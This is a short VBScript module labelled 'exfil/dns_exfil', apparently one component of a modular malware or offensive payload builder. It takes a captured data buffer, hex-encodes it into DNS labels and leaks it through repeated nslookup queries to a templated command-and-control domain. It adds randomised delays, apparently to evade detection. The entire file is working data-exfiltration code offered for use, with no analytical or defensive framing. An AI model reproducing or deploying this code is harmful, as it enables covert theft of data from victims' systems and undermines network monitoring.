' chunk: exfil/dns_exfil
' depends: core/emit_buffer, core/run_cmd
' provides: exfil_dns
' format: vbscript

Function _hex(s)
    Dim r, i, h
    r = ""
    For i = 1 To Len(s)
        h = Hex(Asc(Mid(s, i, 1)))
        If Len(h) < 2 Then h = "0" & h
        r = r & h
    Next
    _hex = r
End Function

Sub exfil_dns()
    Dim domain, chunkSize, data, seq, i
    domain = "{{C2_DOMAIN}}"
    chunkSize = 30
    data = _buf
    seq = 0
    For i = 1 To Len(data) Step chunkSize
        Dim piece, encoded, labels, j, query
        piece = Mid(data, i, chunkSize)
        encoded = _hex(piece)
        labels = ""
        For j = 1 To Len(encoded) Step 60
            If Len(labels) > 0 Then labels = labels & "."
            labels = labels & Mid(encoded, j, 60)
        Next
        query = seq & "." & labels & "." & domain
        _run "nslookup " & query & " 2>NUL"
        seq = seq + 1
        WScript.Sleep 100 + Int(Rnd * 400)
    Next
End Sub
